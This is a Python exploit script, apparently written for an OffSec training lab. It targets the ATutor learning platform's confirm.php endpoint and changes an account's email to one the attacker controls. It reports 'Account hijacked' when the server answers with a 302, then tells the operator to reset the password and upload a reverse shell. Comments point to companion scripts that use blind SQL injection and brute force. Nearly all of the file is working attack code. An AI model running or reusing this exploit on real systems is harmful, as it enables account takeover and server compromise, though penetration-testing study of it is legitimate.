import sys, requests

def update_email(target, id, email):
    
    url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (target, email, id)

    print("[*] Issuing update request to URL: %s" % url)
    res = requests.get(url, allow_redirects=False)
    # Current email address for our target "teacher" account is "teacher@offsec.local"

    # Indicator: we know that after successful e-mail change, app redirects with 302
    if (res.status_code == 302):
        print("[+] Account hijacked with email %s!" % (email))
        print("[!] Manually perform a password reset for the account %s" % (email))
        print("[!] File upload for reverse shell")
        return (email)
    else:
        print("[-] Account hijacking failed!")
        return ("Nothing found")

def main():

    if len(sys.argv) != 4:
        # target is the vulnerable atutor application
        # member_id is retrieved via boolean sqli
        # python searchFriendsBsqli.py atutor.local member_id
        # email is found by brute force
        # python findEmail.py offsec.local 1 "2016-03-22 10:02:26" 4
        print('[+] usage: %s <target> <member_id> <email> ' % sys.argv[0])
        print('[+] eg: %s atutor.local 1 amew@offsec.local' % sys.argv[0])
        sys.exit(-1)

    target = sys.argv[1]
    member_id = sys.argv[2]
    email = sys.argv[3]

    update_email(target, member_id, email)
    

if __name__ == "__main__":
    main()